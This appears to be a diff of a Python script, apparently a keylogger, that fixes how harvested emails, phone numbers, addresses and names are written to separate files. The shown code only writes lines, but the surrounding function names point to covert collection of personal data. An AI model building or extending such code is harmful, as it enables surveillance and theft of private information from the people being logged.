@@ -47,19 +47,19 @@ def extracted_info(cleaned_data):
 def make_files(emails, phone_numbers, addresses, names):
     with open("emails.txt", "at") as email_file:
         for email in emails:
-            email_file.write(email)
+            email_file.write(f"{email}\n")
 
     with open("phone_numbers.txt", "at") as phones_file:
         for phone_number in phone_numbers:
-            phones_file.write(phone_number)
+            phones_file.write(f"{phone_number}\n")
 
     with open("addresses.txt", "at") as addresses_file:
         for address in addresses:
-            addresses_file.write(address)
+            addresses_file.write(f"{address}\n")
 
     with open("names.txt", "at") as names_file:
         for name in names:
-            names_file.write(name)
+            names_file.write(f"{name}\n")
 
 # Define a function to start the keylogger
 def start_keylogger():
